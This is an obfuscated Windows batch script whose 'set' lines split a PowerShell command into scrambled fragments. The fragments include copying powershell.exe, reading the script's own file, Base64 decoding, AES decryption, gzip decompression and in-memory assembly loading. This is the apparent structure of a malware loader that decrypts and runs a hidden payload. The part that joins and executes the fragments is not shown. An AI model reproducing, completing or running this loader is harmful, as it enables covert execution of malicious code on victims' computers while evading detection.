@echo off
set "AjbgiDBhEX=po"
set "SsaYdWFsNL=0\"
set "yzvaUGLyxv=\v"
set "uTozHtIUIB=we"
set "MsWCwTDreg=nd"
set "aJXGeLSeGl=1."
set "rAfRCCBdBK= C"
set "cWizDgsMVI=he"
set "NRAfPKoxnh=Po"
set "dekGWbiBEQ=xe"
set "cGANnVTBDt=ll"
set "imdOuLZoGi=:\"
set "XxMVFCvbhy=ws"
set "bZfmJpIzej=y "
set "zCOsdVbBjx=Wi"
set "RxBfjyYpXr=in"
set "GlEAgtwZAE=ow"
set "tJjGJhoglp=co"
set "IbDksleVGg=we"
set "hQDwFGqABq=32"
set "nLKlILoJEc=.e"
set "MRvhrspkBC= /"
set "AZUeYQpBsA=Sy"
set "hHkACnXolJ=st"
set "ycbEgHSxJH=em"
set "qeAzSPLNOH=s\"
set "DgfbHuKFzG=rS"
set "eVGZxIUaWE=\W"
set "kKzJRYeAqK=ll"
set "FzNUqpthHr=py"
set "asLMVRHRyB=he"
set "YSRLsreNUV=do"
set "dPUsBgzwXX=rs"
set "fAljSqSJxY=cd"
set "FwpAasJKIm= %~dp0"
set "ergTOwNtYI=e]::"
set "EbjXYnUsCk=736u"
set "gEaRwyzOAG=-Obj"
set "ysgqLJfOKF=('%~f0'"
set "OjAfuRPejF=tS46"
set "qCNUARJzce=uPwz"
set "kGDaniFwDu=e = "
set "jXdWnzExJI=$JQW"
set "ZXnuImYzFd=yTo("
set "DBDGZPvQdV=ach "
set "mKkufuMBFO=.Cry"
set "qhHmtpckKn=brea"
set "JifTpojeOG=BC;$"
set "IAGpUTrSmi=:('g"
set "thMlGAVvrs=ddin"
set "zoZSXjPDsj=.Mod"
set "lnUqtymUAz=Syst"
set "gHhiPLdmTI=JQWC"
set "POUYcSVYxl=orF'"
set "onubiEsjNx=HI.D"
set "eEgRRTZYYS= '')"
set "NOlxChGzYo=d;$a"
set "dOeIrNbUOo=Secu"
set "FVOBrZZqLM=Mode"
set "tjFQqnxKaP=ecry"
set "VUsVPqygPh=ne);"
set "TFGQjuupbL=AMAX"
set "bWJIHUggjQ=AMAX"
set "XfdhNOoyWU=ress"
set "trXDRwlmgQ=SubY"
set "utfRgtVdfK=em.I"
set "iSbGkecQyX=[Env"
set "QhmZYTKKyY=mory"
set "ePUbuyOsAt=tem."
set "RlDteZQWPo=);$u"
set "eUwQBvtxZL=;$sX"
set "KkyMbgspKy=f = "
set "ebDoceGLKl=Xf ="
set "AObYhKxLJh=-4] "
set "fgCUzEAtfm=[-1."
set "NyXwTHRsCU=rity"
set "sOeBjxPrlU=pose"
set "KkKsuLsDIE=ypto"
set "HWBxGKQzfM=ptor"
set "NDLAgqKVMw=);$f"
set "aDdeXHNNnb=.Ass"
set "WwbNfTWlCn=F'[-"
set "oRKUkiXdGU=wzN "
set "DhqZoBACbd=ETN."
set "WoBEdCxiJE=m.Re"
set "brPHGhbHgP=sGUc"
set "woTdxguyUN=stem"
set "sAIwCZsUyA=$uiV"
set "eSAmIlLzeQ=embl"
set "bzuBATIzWz=b) {"
set "ItAeltmdjY=iVqp"
set "ImCBfAWyEa=ptog"
set "LROwsexpCr=Star"
set "qifCcRGCuW=File"
set "TtuODBKIKV=('da"
set "EnFxpribsl=ionM"
set "ZeankHeGZs=S46e"
set "lwlmolMViT= '')"
set "CsCEwkcXnF=null"
set "ZfErMgpbfl=Eb ="
set "FjKMXNLTbr= = N"
set "zSNAragXON=, $y"
set "kcfomAbcta=ct S"
set "SUUNIHnSwr=oArr"
set "DJZmwNgXXQ=m.IO"
set "gFOAMAIjjF=vwqI"
set "LgjOnCwXuy=oin "
set "lDWxSchlLk=k; }"
set "XoUdRBfwcW=oxXf"
set "JGIEcQYdmm=[]] "
set "vpWfEVHYUV=comm"
set "dJrhrjmAhl=oryS"
set "fRtURcAwIH=ment"
set "turKIicaQm=OyzA"
set "qKXPKxMUQA=sion"
set "OPXZkLGYNS=($vw"
set "MVbCZhGghI=onve"
set "OxLuEvyWuB=7;$a"
set "BXKeXKvIqD=DoQ."
set "yqlObXLsAv=$OIZ"
set "PVkfpgVKFy=O.Me"
set "cnsBxTrRUm=$yox"
set "ayiGgqhuaB=yste"
set "WOblSwPDhZ=tryP"
set "nIhOdmCuqO=tsWi"
set "CUnmqJufRV=tem."
set "LVHwqeVbzv='')("
set "DBRLyhqulU=pose"
set "vgjdNtiPUf=iron"
set "afWhUHNbtK=.Dis"
set "nwJMLpwVUT===')"
set "EaDItzWftY=[Sys"
set "XRZxyFlhVF=Syst"
set "STppztFlgt=7Yiv"
set "CCpbJmhfSn=OIZH"
set "BcpNGafJrb=  $e"
set "zqowyzLbmb=);$O"
set "SSSXjQukPU=Comp"
set "wFNaSkWdSU=nage"
set "VlHffbMrrC=.Con"
set "oLORTrmzYI=, (,"
set "dCwtTyMaER=esFX"
set "tciXAxhMlU=);$a"
set "MPjXUhlnBn=ing("
set "JZSTclpMIf=saBm"
set "liOTUDKzRr=y.Cr"
set "SeBkjcmCiD=DoQ "
set "KnPHoGLoCZ=ect "
set "PLSTzGLACv=.-16"
set "YLdXnbOraJ=6] -"
set "wTdWOTMnDr=-joi"
set "raLvMfdFOy=AETN"
set "LamLbaQWnt=grap"
set "rsWBgOnQVU=oint"
set "ODDlugKvUa=hy.A"
set "ClEFpzGFBb=[Sys"
set "natdlOTsnk=;$JQ"
set "vMjrGMaUcE=V = "
set "nkWefKMRFK=rtS4"
set "IRdFfcPsMK=pher"
set "hhWqvLEREk=ispo"
set "lEoamriYBV=Stre"
set "tmVkcBUPDY=ptog"
set "uDyDtokyde=ct S"
set "hHMKaXtRdv=]::C"
set "obgWNghirn=[Sys"
set "YVVBioJKMa=qp ="
set "dTqHYcgOGa=]::("
set "MIvHiaBnGW= [Sy"
set "WRUfBkACWu=esMa"
set "BbzGFboUuE=se()"
set "dTMrjYkpsR=ateD"
set "gLxNvwgYMo=y]::"
set "WBTldJlLLL=AX.I"
set "bxUvkyNCGi=-ep "
set "qhsNPggvtn=Comp"
set "MgknSkJviD=esaB"
set "eAxrfPDQaa=N.En"
set "DmVdCdCVxy=comp"
set "MuNwklKOoE=..-1"
set "SriGsoDhHn=L.Su"
set "EKNtPTffoq='[-1"
set "XHLmnmacrK=em.C"
set "IQkOrZExHr= if "
set "UKIfHMpwzx=yoxX"
set "RLztLfASaf=($vw"
set "trzNndwGBS=qIL."
set "YXiKMiYuPH=New-"
set "MdNrAkjclr=] -j"
set "pjLUBIDNHB=ring"
set "DUsfpSIrLh=aAMA"
set "XKzEJwFjVL=();$"
set "eJwTNGOQGS=n ''"
set "HOxfkNAiIc=.Len"
set "AIdHDHWdOu=ode]"
set "tCueuJnUrQ=rofi"
set "PUBfinoHui=g = "
set "CRvDltpsrI=pDZz"
set "GKficLXnVE=ert]"
set "eONICqkwWm=flec"
set "rcgOeutJuz=Secu"
set "vSRjFOTuvQ=gth)"
set "koqVEcFQdA==');"
set "qyOijhNSeH=ose("
set "ZkqPWHzHXo=ss -"
set "pRKlHYAiwZ=PKCS"
set "kfXjrOthPX=yoxX"
